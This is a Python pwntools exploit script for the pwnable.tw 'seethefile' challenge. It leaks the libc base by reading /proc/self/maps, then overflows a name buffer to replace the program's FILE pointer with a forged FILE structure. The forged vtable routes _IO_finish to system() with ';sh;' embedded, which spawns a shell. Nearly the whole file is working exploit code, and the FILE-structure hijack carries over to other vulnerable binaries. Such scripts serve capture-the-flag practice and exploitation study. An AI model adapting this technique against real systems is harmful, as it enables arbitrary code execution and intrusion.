#!/home/khanh/.local/share/pipx/venvs/pwntools/bin/python3
from pwn import *

context.arch = "i386"
context.os = "linux"
context.log_level = 'DEBUG'
context.terminal = ['tmux', 'splitw', '-h']

e = context.binary = ELF("./seethefile_patched")
libc = ELF("./libc_32.so.6")

# HELPER
def B(x, enc='utf-8'):
    if isinstance(x, bytes):
        return x
    return str(x).encode(enc)

def connect():
    HOST, PORT = "chall.pwnable.tw", 10200
    if len(sys.argv) > 1 and sys.argv[1] == 'r':
        return remote(HOST, PORT)
    return e.process()

def GDB(p):
    script = '''
    b *0xf7e76fa5

    '''
    gdb.attach(p, gdbscript=script)

# OFFSET & VARIABLES
NAME = 0x804b260
BSS_SEGMENT_OFFSET = 0x1e3858

# FUNCTIONS
def open_file(p, file_name):
    p.sendlineafter(b"Your choice :", B(1))
    p.sendlineafter(b"What do you want to see :", B(file_name))

def read_file(p):
    p.sendlineafter(b"Your choice :", B(2))

def write_to_screen(p):
    p.sendlineafter(b"Your choice :", B(3))    

def _exit(p, name):
    p.sendlineafter(b"Your choice :", B(5))
    p.sendlineafter(b"Leave your name :", B(name))

# MAIN
def main():

    
    p = connect()

    open_file(p, "/proc/self/maps")

    read_file(p)
    read_file(p)

    write_to_screen(p)

    p.recvline()
    p.recvline()
    p.recvline()
    libc.address = int("0x" + p.recvline()[0:8].decode(), 16)

    print(f"LIBC BASE -> {hex(libc.address)}")
    SYSTEM_ADRESS = libc.symbols["system"]

    payload = b"A" * 8              # padding to _IO_FINISH
    payload += p32(SYSTEM_ADRESS)   # _IO_FINISH
    payload += b"A" * 20
    payload += p32(NAME + 36)       # overwrite "fp" FILE pointer -> NAME + 36
    payload += p32(0xffffdfff)      # <- fake file structure start | "flag" field = 0xffffdfff is (~0x2000)
    payload += b";sh;"
    payload += b"A" * (0x48 - 0x8)  # padding to "_lock" field
    payload += p32(0x804b090)       # assign "_lock" point to <filename+16>, "_lock" can point anywhere that writeable
    payload += p32(NAME)   # _IO_FINISH
    payload += b"A" * (0x90 - 0x4c) # padding to "vtable" field
    payload += p32(NAME)            # assign "vtable" point to NAME

    _exit(p, payload)
    
    p.interactive()

if __name__ == '__main__':
    main()